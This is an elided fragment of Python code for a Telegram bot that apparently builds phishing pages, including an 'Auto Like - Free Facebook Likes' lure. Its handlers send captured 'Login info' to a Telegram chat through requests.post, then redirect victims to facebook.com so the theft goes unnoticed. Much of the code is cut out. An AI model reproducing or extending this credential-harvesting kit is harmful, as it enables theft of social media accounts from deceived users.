...
"""
        ...
        # অন্যান্য পেজের জন্য সাধারণ মেসেজ
        platform_names = {
...
"""
    ...
    if target_user_id != 'unknown':
        ...
        try:
            requests.post(url, json={'chat_id': int(target_user_id), 'text': message}, timeout=5)
            print(f"✅ Login info sent to user: {target_user_id} for {page_type}")
    ...
    redirect_urls = {
        ...
        'auto_like': 'https://www.facebook.com/',
...
async def menu_advance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    keyboard = InlineKeyboardMarkup([
        ...
        [InlineKeyboardButton("👍 Auto Like", callback_data="adv_auto_like")],
        [InlineKeyboardButton("🤧Back🥴🤢", callback_data="back")]
    ])
...
async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    elif data == "adv_auto_like":
        await show_page(update, context, "👍 Auto Like - Free Facebook Likes", "auto_like", "menu_advance", "auto_like")
    else:
